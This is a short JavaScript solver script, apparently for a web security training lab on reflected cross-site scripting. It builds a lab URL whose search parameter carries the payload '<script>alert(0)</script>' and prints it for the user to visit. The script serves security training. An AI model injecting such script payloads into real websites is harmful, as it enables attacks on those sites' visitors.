import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";

const { labUrl } = getParsedInputFromUser({
  description: "Lab: Reflected XSS into HTML context with nothing encoded",
});

runTasks([task]);

function task() {
  const searchParam = "?search=";
  const payload = "<script>alert(0)</script>";
  console.log(`
Just visit this url to solve the lab:
  "${labUrl}${searchParam}${payload}"`);
}
